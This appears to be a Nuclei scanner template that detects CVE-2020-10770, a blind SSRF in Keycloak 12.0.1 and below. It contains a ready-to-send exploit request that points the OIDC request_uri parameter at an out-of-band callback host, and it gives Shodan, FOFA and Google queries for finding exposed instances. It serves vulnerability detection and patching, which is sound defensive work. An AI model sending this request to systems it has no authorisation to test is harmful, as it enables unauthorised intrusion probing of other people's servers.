http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  method: GET
  path:
  - '{{BaseURL}}/auth/realms/master/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=cfx&nonce=cfx&client_id=security-admin-console&request_uri=http://{{interactsh-url}}/'
id: CVE-2020-10770
info:
  author: dhiyaneshDk
  classification:
    cpe: cpe:2.3:a:redhat:keycloak:*:*:*:*:*:*:*:*
    cve-id: CVE-2020-10770
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N
    cvss-score: 5.3
    cwe-id: CWE-918
    epss-percentile: 0.99704
    epss-score: 0.92282
  description: Keycloak 12.0.1 and below allows an attacker to force the server to
    request an unverified URL using the OIDC parameter request_uri. This allows an
    attacker to execute a server-side request forgery (SSRF) attack.
  impact: 'Successful exploitation of this vulnerability could lead to unauthorized
    access to internal resources, data leakage, or further attacks.

    '
  metadata:
    fofa-query:
    - title="keycloak"
    - icon_hash=-1105083093
    - body="keycloak"
    google-query: intitle:"keycloak"
    max-request: 1
    product: keycloak
    shodan-query:
    - http.html:"keycloak"
    - http.title:"keycloak"
    - http.favicon.hash:-1105083093
    vendor: redhat
  name: Keycloak <= 12.0.1 - request_uri Blind Server-Side Request Forgery (SSRF)
  reference:
  - https://packetstormsecurity.com/files/164499/Keycloak-12.0.1-Server-Side-Request-Forgery.html
  - https://www.exploit-db.com/exploits/50405
  - https://nvd.nist.gov/vuln/detail/CVE-2020-10770
  - https://bugzilla.redhat.com/show_bug.cgi?id=1846270
  - https://github.com/soosmile/POC
  remediation: 'Upgrade Keycloak to a version higher than 12.0.1 to mitigate this
    vulnerability.

    '
  severity: medium
  tags: cve,cve2020,keycloak,ssrf,oast,blind,packetstorm,edb,redhat,vkev,vuln
